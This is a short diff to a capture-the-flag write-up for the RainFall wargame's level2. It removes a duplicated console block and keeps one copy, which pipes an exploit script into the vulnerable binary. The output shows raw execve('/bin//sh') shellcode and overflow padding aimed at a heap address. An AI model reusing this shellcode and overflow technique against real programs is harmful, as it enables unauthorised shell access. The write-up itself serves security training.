@@ -287,9 +287,6 @@ The address of our shellcode will be 0x804a008, a value on the heap, which avoid
 The script [level2.py](./level2/resources/level2.py) prints the full exploit.
 
 ```console
-level2@RainFall:~$ (python /tmp/level2.py ; cat) | ./level2
-1�P
-   h//shh/bin��1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
 level2@RainFall:~$ (python /tmp/level2.py ; cat) | ./level2 
 1�P
    h//shh/bin��1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
